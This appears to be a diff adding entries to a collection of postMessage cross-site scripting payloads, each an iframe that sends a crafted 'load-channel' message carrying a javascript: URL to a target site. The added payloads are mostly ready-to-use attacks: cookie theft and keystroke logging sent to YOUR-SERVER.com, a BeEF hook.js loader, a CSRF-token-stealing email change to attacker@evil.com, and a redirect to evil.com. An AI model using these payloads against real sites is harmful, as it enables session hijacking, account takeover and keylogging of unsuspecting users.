@@ -15,6 +15,20 @@
 <iframe src="https://target.com/" onload="this.contentWindow.postMessage('javascript:alert(1)','https://trusted.com')">
 <iframe src="https://target.com/" onload="this.contentWindow.postMessage('<img src=x onerror=alert(1)>','https://trusted.com')">
 
+<iframe src="https://TARGET.com/" onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:alert(1)\"}","*")'>
+
+<iframe src="https://TARGET.com/" onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:fetch('https://YOUR-SERVER.com/steal?c='+document.cookie)\"}","*")'>
+
+<iframe src="https://TARGET.com/" onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:var csrf=document.querySelector('[name=csrf]').value;fetch('/my-account/change-email',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'email=attacker@evil.com&csrf='+csrf})\"}","*")'>
+
+<iframe src="https://TARGET.com/" onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:document.onkeypress=e=>fetch('https://YOUR-SERVER.com/log?key='+e.key)\"}","*")'>
+
+<iframe src="https://TARGET.com/" onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:var s=document.createElement('script');s.src='http://YOUR-BEEF-SERVER:3000/hook.js';document.body.appendChild(s)\"}","*")'>
+
+<iframe src="https://TARGET.com/" onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
+
+<iframe src="https://TARGET.com/" onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:window.location='https://evil.com'\"}","*")'>
+
 <!-- 1.4 Multi-Step PostMessage Attack -->
 <iframe src="https://target.com/" onload="setTimeout(()=>{this.contentWindow.postMessage('step1','*');setTimeout(()=>{this.contentWindow.postMessage('step2','*')},500)},500)">
 
